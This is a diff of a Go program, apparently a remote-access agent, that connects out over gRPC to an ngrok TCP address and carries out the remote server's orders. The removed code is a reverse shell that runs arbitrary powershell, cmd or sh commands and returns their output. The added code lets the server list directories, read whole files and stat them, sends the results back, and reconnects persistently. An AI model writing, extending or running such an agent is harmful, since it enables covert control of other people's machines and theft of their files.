@@ -2,89 +2,113 @@ package main
 
 import (
 	"context"
+	"fmt"
 	"log"
-	"os/exec"
-	"runtime"
+	"os"
+	"os/signal"
 	"strings"
+	"time"
 
 	"github.com/cardfaux/windows-connect/grpcapi"
 	"google.golang.org/grpc"
+	"google.golang.org/grpc/keepalive"
 )
 
-func getCommandForShell(shell string, command string) *exec.Cmd {
-	switch strings.ToLower(shell) {
-	case "powershell":
-		return exec.Command("powershell", "-Command", command)
-	case "cmd":
-		return exec.Command("cmd", "/C", command)
-	case "sh":
-		return exec.Command("/bin/sh", "-c", command)
-	default:
-		if runtime.GOOS == "windows" {
-			return exec.Command("cmd", "/C", command)
+func handleCommand(req *grpcapi.CommandRequest) *grpcapi.CommandResponse {
+	switch req.Command {
+	case grpcapi.CommandType_LIST_FILES:
+		entries, err := os.ReadDir(req.Argument)
+		if err != nil {
+			return &grpcapi.CommandResponse{Success: false, Error: err.Error()}
 		}
-		return exec.Command("/bin/sh", "-c", command)
+		var files []string
+		for _, e := range entries {
+			name := e.Name()
+			if e.IsDir() {
+				name += "/"
+			}
+			files = append(files, name)
+		}
+		return &grpcapi.CommandResponse{Output: strings.Join(files, "\n"), Success: true}
+
+	case grpcapi.CommandType_GET_FILE:
+		data, err := os.ReadFile(req.Argument)
+		if err != nil {
+			return &grpcapi.CommandResponse{Success: false, Error: err.Error()}
+		}
+		return &grpcapi.CommandResponse{Output: string(data), Success: true}
+
+	case grpcapi.CommandType_GET_INFO:
+		fi, err := os.Stat(req.Argument)
+		if err != nil {
+			return &grpcapi.CommandResponse{Success: false, Error: err.Error()}
+		}
+		info := fmt.Sprintf("Name: %s\nSize: %d bytes\nModified: %s\n", fi.Name(), fi.Size(), fi.ModTime())
+		return &grpcapi.CommandResponse{Output: info, Success: true}
+
+	default:
+		return &grpcapi.CommandResponse{Success: false, Error: "Unknown command"}
 	}
 }
 
 func main() {
-	conn, err := grpc.Dial("0.tcp.ngrok.io:11048", grpc.WithInsecure())
-	if err != nil {
-		log.Fatalf("Failed to connect: %v", err)
-	}
-	defer conn.Close()
+	serverAddr := "2.tcp.ngrok.io:17244"
 
-	client := grpcapi.NewEchoServiceClient(conn)
-	stream, err := client.ExecuteCommand(context.Background())
-	if err != nil {
-		log.Fatalf("Failed to create stream: %v", err)
-	}
+	// Handle Ctrl+C clean exit
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt)
 
-	// Goroutine to receive commands from server
 	go func() {
+		<-sig
+		log.Println("Received interrupt. Exiting.")
+		os.Exit(0)
+	}()
+
+	for {
+		conn, err := grpc.Dial(
+			serverAddr,
+			grpc.WithInsecure(),
+			grpc.WithKeepaliveParams(keepalive.ClientParameters{
+				Time:                30 * time.Second,
+				Timeout:             10 * time.Second,
+				PermitWithoutStream: true,
+			}),
+		)
+		if err != nil {
+			log.Printf("Failed to connect: %v. Retrying in 5s...", err)
+			time.Sleep(5 * time.Second)
+			continue
+		}
+
+		client := grpcapi.NewEchoServiceClient(conn)
+		stream, err := client.ExecuteCommand(context.Background())
+		if err != nil {
+			log.Printf("Stream error: %v. Retrying in 5s...", err)
+			conn.Close()
+			time.Sleep(5 * time.Second)
+			continue
+		}
+
+		log.Println("Connected to server. Waiting for commands...")
+
 		for {
 			msg, err := stream.Recv()
 			if err != nil {
-					log.Printf("Stream receive error: %v", err)
-					return
+				log.Printf("Stream closed: %v. Reconnecting...", err)
+				conn.Close()
+				break // reconnect
 			}
-	
-			switch m := msg.Message.(type) {
-			case *grpcapi.CommandMessage_CommandRequest:
-					cmdReq := m.CommandRequest
-					shell := cmdReq.Shell
-					command := cmdReq.Command
-	
-					log.Printf("Received command with shell [%s]: %s", shell, command)
-					cmd := getCommandForShell(shell, command)
-					output, err := cmd.CombinedOutput()
-					if err != nil {
-							log.Printf("Execution error: %v", err)
-					}
-	
-					err = stream.Send(&grpcapi.CommandMessage{
-							Message: &grpcapi.CommandMessage_CommandResponse{
-									CommandResponse: &grpcapi.CommandResponse{
-											Output: string(output),
-									},
-							},
-					})
-					if err != nil {
-							log.Printf("Failed to send output: %v", err)
-							return
-					}
-					log.Println("Output sent to server.")
-	
-			case *grpcapi.CommandMessage_CommandResponse:
-					// If your client ever expects to receive output, handle here
-					log.Printf("Received output: %s", m.CommandResponse.Output)
-	
-			default:
-					log.Printf("Unknown message type received")
+			if req := msg.GetCommandRequest(); req != nil {
+				resp := handleCommand(req)
+				err = stream.Send(&grpcapi.CommandMessage{
+					Message: &grpcapi.CommandMessage_CommandResponse{CommandResponse: resp},
+				})
+				if err != nil {
+					log.Printf("Send error: %v. Reconnecting...", err)
+					conn.Close()
+					break // reconnect
+				}
 			}
+		}
 	}
-	}()
-
-	// Block main forever
-	select {}
 }
